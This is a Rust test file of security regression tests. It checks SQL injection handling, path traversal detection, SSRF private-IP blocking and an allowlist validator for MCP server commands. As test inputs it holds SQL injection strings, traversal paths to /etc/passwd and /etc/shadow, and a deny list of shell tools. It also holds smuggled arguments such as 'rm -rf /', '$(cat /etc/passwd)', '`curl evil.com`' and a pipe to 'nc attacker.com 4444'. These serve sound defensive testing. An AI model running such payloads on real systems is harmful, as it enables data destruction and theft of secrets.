//! Security regression tests
//!
//! These tests verify that common attack vectors are properly mitigated.

#[cfg(test)]
mod tests {
    /// Verify that SQL injection payloads are safely handled by parameterized queries.
    /// Since actual DB queries go through sqlx with bind params, we verify the
    /// pattern that no raw string interpolation reaches query execution.
    #[test]
    fn test_sql_injection_payloads_are_safe_strings() {
        let payloads = vec![
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "'; INSERT INTO admin VALUES ('hacker','password'); --",
            "' UNION SELECT * FROM secrets --",
            "1; DELETE FROM learning_items WHERE '1'='1",
            "\" OR \"\"=\"",
        ];
        // Verify payloads are valid strings that won't crash bind param serialization
        for payload in &payloads {
            let serialized = serde_json::to_string(payload).unwrap();
            assert!(serialized.starts_with('"'));
        }
    }

    /// Verify that path traversal payloads are detectable
    #[test]
    fn test_path_traversal_detection() {
        use std::path::PathBuf;

        fn is_path_traversal(path: &str) -> bool {
            let p = PathBuf::from(path);
            p.components().any(|c| matches!(c, std::path::Component::ParentDir))
        }

        assert!(is_path_traversal("../../etc/passwd"));
        assert!(is_path_traversal("docs/../../../etc/shadow"));
        // Note: backslash paths only trigger traversal on Windows;
        // on Unix, PathBuf treats backslash as a normal filename char.
        #[cfg(target_os = "windows")]
        assert!(is_path_traversal("..\\windows\\system32\\config"));
        #[cfg(not(target_os = "windows"))]
        assert!(!is_path_traversal("..\\windows\\system32\\config"));
        assert!(!is_path_traversal("documents/notes.pdf"));
        assert!(!is_path_traversal("/home/user/file.txt"));
    }

    /// Verify SSRF protection catches private IP ranges
    #[test]
    fn test_ssrf_private_ip_detection() {
        fn is_private_url(url: &str) -> bool {
            let host = url::Url::parse(url)
                .ok()
                .and_then(|u| u.host_str().map(|h| h.to_string()));

            let Some(host) = host else { return true };

            // Block private/loopback/link-local addresses
            let private_prefixes = [
                "127.", "10.", "192.168.", "172.16.", "172.17.", "172.18.",
                "172.19.", "172.20.", "172.21.", "172.22.", "172.23.",
                "172.24.", "172.25.", "172.26.", "172.27.", "172.28.",
                "172.29.", "172.30.", "172.31.", "169.254.", "[::1]",
                "0.0.0.0", "localhost",
            ];

            private_prefixes.iter().any(|prefix| host.starts_with(prefix) || host == *prefix)
        }

        assert!(is_private_url("http://127.0.0.1/admin"));
        assert!(is_private_url("http://localhost:8080/api"));
        assert!(is_private_url("http://169.254.169.254/latest/meta-data"));
        assert!(is_private_url("http://10.0.0.1/internal"));
        assert!(is_private_url("http://192.168.1.1/local"));
        assert!(!is_private_url("https://api.openai.com/v1/chat"));
        assert!(!is_private_url("https://example.com/page"));
    }

    /// Verify MCP allowlist contains only known-safe executables
    #[test]
    fn test_mcp_allowlist_is_restricted() {
        let allowlist = ["npx", "uvx", "node", "python", "python3"];

        // Verify no dangerous commands are allowed
        let dangerous = ["rm", "sh", "bash", "curl", "wget", "nc", "perl", "ruby"];
        for cmd in &dangerous {
            assert!(!allowlist.contains(cmd), "{} should not be in MCP allowlist", cmd);
        }
    }

    /// Verify the runtime MCP command validator rejects dangerous inputs
    #[test]
    fn test_mcp_runtime_validation() {
        use crate::commands::mcp::validate_mcp_command;

        // Allowed commands should pass
        assert!(validate_mcp_command("npx", &["some-package".into()]).is_ok());
        assert!(validate_mcp_command("node", &["server.js".into()]).is_ok());
        assert!(validate_mcp_command("python3", &["-m".into(), "mymcp".into()]).is_ok());

        // Paths must be rejected
        assert!(validate_mcp_command("/bin/bash", &[]).is_err());
        assert!(validate_mcp_command("./exploit", &[]).is_err());
        assert!(validate_mcp_command("../hidden/cmd", &[]).is_err());
        assert!(validate_mcp_command("C:\\Windows\\cmd.exe", &[]).is_err());

        // Disallowed commands must be rejected
        assert!(validate_mcp_command("bash", &[]).is_err());
        assert!(validate_mcp_command("curl", &[]).is_err());
        assert!(validate_mcp_command("sh", &[]).is_err());

        // Arguments with shell metacharacters must be rejected
        assert!(validate_mcp_command("npx", &["; rm -rf /".into()]).is_err());
        assert!(validate_mcp_command("node", &["$(cat /etc/passwd)".into()]).is_err());
        assert!(validate_mcp_command("python3", &["`curl evil.com`".into()]).is_err());
        assert!(validate_mcp_command("npx", &["package".into(), "| nc attacker.com 4444".into()]).is_err());
    }
}
